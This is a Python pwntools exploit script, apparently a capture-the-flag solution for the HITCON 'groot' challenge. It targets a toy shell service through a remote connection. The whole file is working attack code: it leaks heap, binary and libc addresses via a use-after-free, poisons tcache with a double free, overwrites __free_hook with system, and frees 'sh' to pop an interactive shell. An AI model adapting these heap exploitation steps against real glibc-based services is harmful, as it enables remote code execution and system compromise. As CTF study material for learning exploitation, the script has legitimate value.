#!/usr/bin/env python

from __future__ import print_function
from pwn import *

context.update(os='linux', arch='amd64',
	log_level='debug',
)

elf = ELF('groot')
libc_puts = 0x00000000000809c0
libc_free_hook = 0x00000000003ed8e8
libc_system = 0x000000000004f440
t = remote(args['HOST'] or 'localhost', args['PORT'] or 31733)

# trick: this generates known, readable addresses with no null-bytes
vsyscall_data = 'cccccccccccccccccccccccccccccccc48c7c0c9'.decode('hex')
vsyscall_start = 0xffffffffff6003f0
vsyscall_c9 = 0xffffffffff600403
vsyscall_cur = -1
def vsyscall_next():
	global vsyscall_cur
	vsyscall_cur += 1
	if (vsyscall_cur + vsyscall_start) & 0xff == 0:
		vsyscall_cur += 1
	return (vsyscall_cur + vsyscall_start, vsyscall_data[vsyscall_cur:])


prompts = 0

def clear_prompts(extra=0):
	global prompts
	last = None
	while prompts > -extra:
		last = t.recvuntil('$ ', drop=True)
		prompts -= 1
	return last

def cmd(*data):
	global prompts

	cmd = ' '.join(map(str, data))
	assert len(cmd) < 99
	t.sendline(cmd)
	prompts += 1

def resize_filename(file, binsize=0x30):
	lo = binsize - 0x18
	hi = binsize - 0x8
	assert len(file) <= hi
	if len(file) > lo:
		return file
	return '.' + file.rjust(0x18, '/')

def first_child(dir):
	cmd('ls', dir)
	clear_prompts()
	t.recvuntil('..\x1b[0m\t')
	return t.recvuntil('\x1b', drop=True)

def genp(count):
	return ''.join(random.choice(string.ascii_lowercase) for _ in xrange(count))

def leak_heap_bin():
	namex = genp(6)
	namea = genp(6)
	cmd('touch', namex)
	cmd('mkdir', namea)
	cmd('cd', namea)
	cmd('touch', 'b')
	cmd('cd ..')
	cmd('rm', namex)
	cmd('rm', namea)
	name1 = genp(6)
	# land on namex with child pointer to freed b
	cmd('mkdir', name1)
	# reads freed name pointer of b child
	heap_addr_str = first_child(name1)
	heap_addr = unpack(heap_addr_str, 'all')
	log.info('Heap addr %x', heap_addr)
	# parent pointer of directory to root fs in data
	read_addr = heap_addr + 0x508 - 0xb80
	va, new_name = vsyscall_next()
	# land on freed b, clobbering name with va and data with read_addr
	cmd('ls', 'P' * 0x20 + p64(va) + p64(read_addr))
	cmd('cd', name1)
	# read the data of clobbered file
	cmd('cat', new_name)
	elf.address = unpack(clear_prompts(extra=1), 'all') - 0x204040
	log.info('Binary base %x', elf.address)
	cmd('cd', '..')
	return heap_addr

def slow_read(read_addr):
	namea = genp(6)
	cmd('mkdir', namea)
	cmd('cd', namea)
	cmd('touch', 'b')
	cmd('cd ..')
	cmd('rm', namea)
	name1 = genp(6)
	# make a directory, reusing namea keeping ptr to b
	cmd('mkdir', name1)
	va, new_name = vsyscall_next()
	# land on b, overwriting name with va and data with read_addr
	cmd('ls', 'P' * 0x20 + p64(va) + p64(read_addr))
	cmd('cd', name1)
	cmd('cat', new_name)
	result = clear_prompts(extra=1)
	cmd('cd', '..')
	return result

leak_heap_bin()
puts_addr = unpack(slow_read(elf.got['puts']), 'all')
libc_base = puts_addr-libc_puts
log.info('Puts %x Base %x', puts_addr, libc_base)

namea = genp(0x20)
# used for freeing "sh"
cmd('touch', 'sh')
cmd('mkdir', namea)
cmd('cd', namea)
# make a directory to only have name not data pointer
cmd('mkdir', 'b')
cmd('cd', '..')
cmd('rm', namea)
# land on namea with child pointing to b
cmd('mkdir', namea)
# free b again (into tcache) (double-freeing the name of b)
cmd('rm', namea)
# alloc from tcache, overwriting next to free_hook
cmd('ls', p64(libc_base + libc_free_hook))
# alloc from tcache; now tcache points to free_hook
cmd('ls', 'tmp')
# alloc from tcache onto free_hook, write system
cmd('ls', p64(libc_base + libc_system))
# free("sh")
cmd('rm', 'sh')
t.interactive()

# hitcon{Groot_knows_heap_exploitation:evergreen_tree:}
